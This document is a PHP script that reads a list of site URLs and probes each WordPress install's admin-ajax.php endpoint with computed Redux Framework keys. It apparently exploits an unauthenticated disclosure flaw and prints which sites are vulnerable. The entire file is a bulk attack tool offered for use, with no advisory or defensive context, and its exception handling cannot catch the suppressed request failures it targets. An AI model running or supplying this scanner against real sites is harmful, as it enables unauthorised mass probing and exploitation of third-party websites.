<?php

// Open the file containing the URLs
$file = fopen("file.txt", "r");

// Read the file line by line
while (($line = fgets($file)) !== false) {
  // Trim the newline character from the line
  $target = trim($line);

  // Calculate key1
  $key1 = md5("$target/-redux");

  // Calculate key2
  try {
    $key2 = @file_get_contents("$target/wp-admin/admin-ajax.php?action=$key1");
  } catch (Exception $e) {
    // Handle the exception
    echo "An error occurred while trying to retrieve key2: " . $e->getMessage() . "\n";
    continue;
  }

  // Calculate key3
  $key3 = md5($key2 . '-support');

  // Retrieve redux code
  try {
    $redux_code = @file_get_contents("http://verify.redux.io/?hash=$key3&site=$target/");
  } catch (Exception $e) {
    // Handle the exception
    echo "An error occurred while trying to retrieve the redux code: " . $e->getMessage() . "\n";
    continue;
  }

  // Make an HTTP request to the admin-ajax.php endpoint
  try {
    $response = @file_get_contents("$target/wp-admin/admin-ajax.php?action=$key3&code=$redux_code");
  } catch (Exception $e) {
    // Handle the exception
    echo "An error occurred while trying to retrieve the response: " . $e->getMessage() . "\n";
    continue;
  }

  // Check if the response contains some information
  if (strlen($response) > 0) {
    // Print "vulnerable
    echo "$target is vulnerable\n";
  } else {
    // Print "not vulnerable" if the response is empty
    echo "$target is not vulnerable\n";
  }
}

// Close the file
fclose($file);
